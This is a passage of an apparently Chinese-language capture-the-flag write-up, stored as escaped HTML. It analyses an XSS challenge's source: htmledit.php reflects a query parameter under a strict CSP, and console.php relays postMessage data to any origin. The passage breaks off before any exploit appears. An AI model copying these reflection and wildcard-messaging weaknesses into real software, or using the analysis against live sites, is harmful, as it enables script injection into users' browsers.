class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;clear&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;*&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;🗑️&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;a&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;       &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;span&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;       &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;iframe&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;console&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;./console.php&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;iframe&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;       &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;iframe&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;codeFrame&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;./htmledit.php?code=&amp;lt;img src=x&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;iframe&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;       &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;textarea&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;oninput&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;this.previousElementSibling.src=&lt;span class=&quot;token punctuation&quot;&gt;&#39;&lt;/span&gt;./htmledit.php?code=&lt;span class=&quot;token punctuation&quot;&gt;&#39;&lt;/span&gt;+escape(this.value)&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;img&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;x&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;textarea&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt; &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;除了被註解的那一段變數之外，看起來沒什麼特別的。&lt;/p&gt;
&lt;h3 id=&quot;htmledit.php&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#htmledit.php&quot;&gt;#&lt;/a&gt; htmledit.php&lt;/h3&gt;
&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;&amp;lt;!-- &amp;amp;lt;img src=x&amp;amp;gt; --&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token doctype&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&quot;token doctype-tag&quot;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&quot;token name&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;html&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;en&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;meta&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;UTF-8&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;title&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Native HTML editor&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;title&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;nonce&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;d8f00e6635e69bafbf1210ff32f96bdb&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token script&quot;&gt;&lt;span class=&quot;token language-javascript&quot;&gt;&lt;br&gt;        window&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;error&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; obj &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;type&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;err&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;message&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                obj&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;text &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;message&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                obj&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;text &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;Exception called on &lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;target&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;outerHTML&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;            top&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;fromIframe&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;obj&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;*&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token function-variable function&quot;&gt;onmessage&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            top&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;fromIframe&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;*&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;body&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;img&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;x&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;body&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token comment&quot;&gt;&amp;lt;!-- /* Page loaded in 0.000024 seconds */ --&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;這個頁面會直接把 query string code 的內容顯示在頁面上，然後開頭還有一段神秘的註解，是把 code encode 之後的內容。但儘管顯示在頁面上卻沒辦法執行，因為有著嚴格的 CSP：&lt;code&gt;script-src &#39;nonce-...&#39;;frame-src https:;object-src &#39;none&#39;;base-uri &#39;none&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;不過 CSP 裡面特別開了 frame-src，我看到這邊的時候想說：「這可能是個提示，提示我們要用 iframe」&lt;/p&gt;
&lt;h3 id=&quot;console.php&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#console.php&quot;&gt;#&lt;/a&gt; console.php&lt;/h3&gt;
&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token doctype&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&quot;token doctype-tag&quot;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&quot;token name&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;html&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;en&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;meta&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;UTF-8&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;nonce&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;c4936ad76292ee7100ecb9d72054e71f&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token script&quot;&gt;&lt;span class=&quot;token language-javascript&quot;&gt;&lt;br&gt;        name &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;Console&#39;&lt;/span&gt;&lt;br&gt;        document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;title &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; name&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;top &lt;span class=&quot;token operator&quot;&gt;===&lt;/span&gt; window&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;head&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parentNode&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// hide code if not on iframe&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;style&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token style&quot;&gt;&lt;span class=&quot;token language-css&quot;&gt;&lt;br&gt;        &lt;span class=&quot;token selector&quot;&gt;body, ul&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token property&quot;&gt;margin&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;0&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token property&quot;&gt;padding&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;0&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;        &lt;span class=&quot;token selector&quot;&gt;ul#console&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token property&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; lightyellow&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token property&quot;&gt;list-style-type&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; none&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token property&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;Roboto Mono&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; monospace&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token property&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 14px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token property&quot;&gt;line-height&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 25px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;        &lt;span class=&quot;token selector&quot;&gt;ul#console li&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token property&quot;&gt;border-bottom&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; solid 1px #80808038&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token property&quot;&gt;padding-left&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 5px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;style&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;body&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;ul&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;console&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;ul&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;nonce&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;c4936ad76292ee7100ecb9d72054e71f&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token script&quot;&gt;&lt;span class=&quot;token 